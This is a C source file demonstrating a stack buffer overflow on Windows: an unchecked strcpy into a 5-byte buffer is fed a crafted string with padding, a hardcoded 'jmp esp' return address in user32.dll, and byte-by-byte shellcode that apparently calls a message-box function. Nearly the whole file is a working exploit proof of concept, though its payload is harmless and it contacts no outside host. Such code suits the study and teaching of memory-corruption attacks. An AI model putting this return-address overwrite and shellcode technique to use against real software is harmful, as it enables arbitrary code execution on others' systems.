#include <stdio.h>
#include <string.h>
#include <windows.h>

void overflow(char* buf)
{
	char des[5]="";
	strcpy(des,buf);
	return;
}
int main(int argc,char *argv[])
{
	LoadLibrary("user32.dll");
	//	if(argc>1)
    char longbuf[100]="aaaaaaaaaaaa";
                longbuf[12]='\xc8';
	longbuf[13]='\xae';
	longbuf[14]='\xd5';
	longbuf[15]='\x77';//77d5aec8   jmp esp
                longbuf[16]='\x33';
                longbuf[17]='\xdb';
	longbuf[18]='\x53';
	longbuf[19]='\x53';
	longbuf[20]='\x53';
	longbuf[21]='\x53';
	longbuf[22]='\xb8';
	longbuf[23]='\xea';
	longbuf[24]='\x04';
	longbuf[25]='\xd5';
	longbuf[26]='\x77';
	longbuf[27]='\xff';
	longbuf[28]='\xd0'; //shellcode
	overflow(longbuf);
//	overflow(argv[1]);
    return 0;
}


//AAAAAAAAAAAAA+jmp esp÷∏¡Óµÿ÷∑+shellcode
